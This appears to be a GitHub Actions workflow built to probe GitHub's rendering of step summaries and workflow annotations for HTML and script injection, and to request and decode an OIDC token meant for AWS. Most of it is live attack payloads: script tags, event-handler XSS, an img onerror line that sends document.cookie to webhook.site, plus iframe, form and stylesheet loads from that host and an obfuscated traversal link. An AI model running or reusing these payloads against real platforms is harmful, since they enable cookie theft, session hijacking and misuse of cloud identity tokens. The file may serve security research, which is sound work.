name: Inspector
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Step Summary HTML Injection test
        run: |
          # Test various injection payloads in step summary
          cat >> $GITHUB_STEP_SUMMARY << 'SUMMARY'
          # Step Summary Injection Test

          ## Markdown test
          **Normal bold**

          ## Raw HTML test
          <h1 id="html-h1">Raw H1 via HTML</h1>
          <script>document.title='XSS-FIRED'</script>
          <img src=x onerror="fetch('https://webhook.site/xss?cookie='+document.cookie)">
          <svg onload="alert('SVG-XSS')"><rect width="100" height="100"/></svg>
          <details open ontoggle="alert('ontoggle-xss')"><summary>click</summary></details>

          ## CSS injection test
          <style>body{background:red}</style>
          <link rel="stylesheet" href="https://webhook.site/css-load?src=github">

          ## Content injection
          <iframe src="https://webhook.site/iframe"></iframe>
          <form action="https://webhook.site/form"><input name="cookie" value="test"/><button>Submit</button></form>

          ## Unicode zero-width / homograph test
          Normal looking link: [Click](https://github.com&#x2F;&#x2E;&#x2E;/settings)

          SUMMARY
          echo "Step summary written"

      - name: Run name injection test
        run: |
          # Can we change the run name via workflow command?
          echo "::notice title=INJECTED-NOTICE::<script>alert(1)</script>"
          echo "::error title=ERROR-INJECTION::<img src=x onerror=alert(2)>"
          echo "::warning::<script>alert('warning-xss')</script>"

      - name: merge_group OIDC claims test
        run: |
          echo "=== CURRENT TRIGGER ==="
          echo "Event: $GITHUB_EVENT_NAME"
          echo "Ref: $GITHUB_REF"
          echo "Head Ref: $GITHUB_HEAD_REF"
          echo "Base Ref: $GITHUB_BASE_REF"
          echo ""
          echo "=== OIDC CLAIMS FOR THIS TRIGGER ==="
          T=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value // "FAILED"')
          if [ "$T" != "FAILED" ]; then
            echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('ref:', d.get('ref'))
print('head_ref:', d.get('head_ref'))
print('base_ref:', d.get('base_ref'))
print('event_name:', d.get('event_name'))
print('sub:', d.get('sub'))
print('ref_protected:', d.get('ref_protected'))
print('workflow_ref:', d.get('workflow_ref'))
"
          fi
